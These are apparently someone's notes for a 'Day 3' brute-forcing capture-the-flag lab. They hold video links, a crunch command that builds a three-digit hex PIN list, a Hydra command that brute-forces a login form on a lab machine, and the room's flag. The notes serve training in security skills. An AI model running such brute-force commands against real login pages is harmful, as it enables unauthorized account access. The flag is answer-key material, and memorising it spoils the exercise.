
# [Day 3] Brute-forcing Hydra is Coming to Town

https://www.youtube.com/watch?v=UKAchyX7kDY


alternate
https://www.youtube.com/watch?v=zkFsslIkF-Y

```

crunch 3 3 0123456789ABCDEF -o 3digits.txt

hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000



THM{pin-code-brute-force}


```